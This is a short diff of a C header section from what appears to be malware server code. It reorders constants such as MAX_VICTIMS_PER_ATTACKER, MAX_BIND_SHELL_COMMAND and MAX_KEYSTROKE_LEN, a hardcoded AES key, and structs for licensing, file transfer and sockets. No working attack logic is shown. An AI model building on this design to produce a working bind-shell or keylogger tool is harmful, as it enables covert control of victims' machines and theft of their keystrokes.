@@ -16,15 +16,12 @@
 #define FALSE 0 
 #define MTU 1024
 #define PORT 50007
-#define HASH_LEN 34
-//#define MAX_CLIENTS 30
-#define MAX_VICTIMS_PER_ATTACKER 10
-#define MAX_BIND_SHELL_COMMAND 500
-
 #define MAX_VICTIMS_PER_ATTACKER 10
 
-#define AES_KEY "PASS_AES_KEY" // obfuscate it !!!  lol
 #define ENCRYPTED_TEXT_LEN(len) (int) ((len * 1.36) + 100)
+#define AES_KEY "PASS_AES_KEY" // obfuscate it !!! lol
+#define HASH_LEN 34
+#define MAX_BIND_SHELL_COMMAND 500
 #define MAX_PASSWORD_LEN 16
 #define MAX_USER_NAME_LEN 32
 #define MAX_KEYSTROKE_LEN 20
@@ -88,6 +85,7 @@ typedef struct {
 	char password[ENCRYPTED_TEXT_LEN(MAX_PASSWORD_LEN)];
 } encrypted_buying_license_key_protocol;
 
+
 typedef struct {
 	char file_sub_buffer[MTU];
 	int end_of_file;
@@ -121,7 +119,6 @@ typedef struct {
 } encrypted_general_message_protocol;
 
 
-//client_delet clients_list[MAX_CLIENTS];
 int master_socket, addrlen, new_socket, activity, socket_descriptor;
 int max_socket_descriptor; 
 fd_set readfds; //set of socket descriptors
